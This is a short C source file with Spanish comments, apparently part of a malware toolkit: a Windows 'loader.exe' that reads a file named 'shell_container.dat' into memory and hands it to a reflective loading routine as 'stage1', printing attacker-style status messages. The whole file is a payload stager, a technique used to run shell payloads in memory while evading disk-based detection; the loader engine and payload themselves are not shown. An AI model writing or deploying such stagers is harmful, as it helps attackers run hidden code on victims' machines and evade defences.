// loader.exe solo carga el archivo .dat y llama al reflective_loader.c
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "reflective_loader.h"

int main() {
    // Carga el contenedor .dat a memoria
    FILE* f = fopen("shell_container.dat", "rb");
    if (!f) return -1;
    fseek(f, 0, SEEK_END);
    size_t size = ftell(f);
    rewind(f);

    unsigned char* buffer = (unsigned char*)malloc(size);
    fread(buffer, 1, size, f);
    fclose(f);

    // Llama al motor de carga reflectiva con el buffer
    if (!load_reflective_stage1(buffer, size)) {
        printf("[!] Error cargando stage1 desde shell_container.dat\n");
        return -2;
    }

    printf("[+] Carga inicial finalizada.\n");
    return 0;
}
